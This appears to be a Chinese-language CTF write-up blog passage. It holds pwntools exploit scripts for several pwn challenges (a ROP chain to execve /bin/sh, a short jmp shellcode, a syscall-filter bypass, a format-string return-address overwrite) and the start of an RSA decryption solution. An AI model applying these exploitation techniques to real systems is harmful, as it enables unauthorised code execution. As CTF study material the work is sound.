ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


ru<span class="token punctuation">(</span><span class="token string">"Input seven single digits:\n"</span><span class="token punctuation">)</span>

v7 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">7</span>
v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span>
v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span>
v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span>
v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"The address is:"</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>

rdi <span class="token operator">=</span> <span class="token number">0x000000000040168e</span>
execve <span class="token operator">=</span> <span class="token number">0x40129B</span>


payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x40</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>execve
<span class="token punctuation">]</span><span class="token punctuation">)</span>

s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="shellcode-level3-补"><a href="#shellcode-level3-补" class="headerlink" title="shellcode_level3[补]"></a>shellcode_level3[补]</h2><p>gets(code) 输入的位置，只有前五个字节有可执行的权限，有一个backdoor function，jmp 过去就好了， jmp的字节码是e9，相对寻址(rip) 后面跟的是一个偏移地址，算一下code的地址到backdoor的偏移是多少，转换成补码就好了，注意一下端序是小端序</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5 bytes ni neng miao sha wo?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>GLOBAL_OFFSET_TABLE_<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_40408E<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xF72uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>code<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">givemeshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./shellcode_level3'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.94.193"</span>
    port <span class="token operator">=</span> <span class="token number">57295</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 40408E - 4011D6 = 11960 # -11960的补码是 48d1ffff, 小端序</span>
shellcode <span class="token operator">=</span> <span class="token string">b"\xe9\x48\xd1\xff\xff"</span>
sl<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="changeable-shellcode-补"><a href="#changeable-shellcode-补" class="headerlink" title="changeable_shellcode [补]"></a>changeable_shellcode [补]</h2><p>有一个filter函数，把syscall给过滤了，那能不能在shellcode中，造一个syscall出来？</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Is that 'syscall'?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      buf<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oh, nothing."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>b’\x0f\x00’，把\x00修改成 05就是syscall的字节码了，这个偏移可以通过字符串长度来算，因为00是在结尾的 len -1 就是偏移了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./shellcode'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.94.193"</span>
    port <span class="token operator">=</span> <span class="token number">54025</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>



ru<span class="token punctuation">(</span><span class="token string">"Please input your shellcode: \n"</span><span class="token punctuation">)</span>


shellcode1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov rax,0x68732f6e69622f
push rax
push rsp
pop rdi
xor esi,esi
xor edx,edx
push 0x3b
pop rax
'''</span>
<span class="token punctuation">)</span>

shellcode1 <span class="token operator">+=</span> <span class="token string">b'\x0f\x00'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>shellcode1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

shellcode2 <span class="token operator">=</span> asm<span class="token punctuation">(</span>
    <span class="token triple-quoted-string string">"""
    mov al, 0x05
    mov [0x114514020], al
    """</span>
<span class="token punctuation">)</span>

payload <span class="token operator">=</span> shellcode2 <span class="token operator">+</span> shellcode1

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="format-level2-补"><a href="#format-level2-补" class="headerlink" title="format_level2[补]"></a>format_level2[补]</h2><p>got表不可改，有一个cat flag的backdoor函数，先用格式化字符串泄露一个栈相关的地址，利用偏移算出main的返回地址，然后把main的返回地址的低位修改成backdoor的低位，这样就能jmp到backdoor上了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./format_level2'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.94.193"</span>
    port <span class="token operator">=</span> <span class="token number">51366</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"You said: \n"</span><span class="token punctuation">)</span>
leak_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'But'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> leak_addr <span class="token operator">+</span> <span class="token number">64</span>

success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 08049317</span>
payload <span class="token operator">=</span> <span class="token string">b"%23p%10$hhn"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"%147p%10$hhn"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


sl<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a>Crypto 入门指北</h2><p>去查询了一下指北里面的信息</p>
<p>欧拉函数 的定义是小于等于n和n互质数的个数，n是质数的时候则为n-1</p>
<p>然后 ax mod b &#x3D; 1的时候，x则称作a mod b的逆元，是a的倒数</p>
<p>所以d &#x3D; pow(e, -1, phi)这个是这么来的</p>
<p>得到私钥后就直接解密拿到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment"># 一个非常好用的crypto库</span>

p <span class="token operator">=</span> <span class="token number">0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7</span>
q <span class="token operator">=</span> <span class="token number">0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb</span>
c <span class="token operator">=</span> <span class="token number">0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
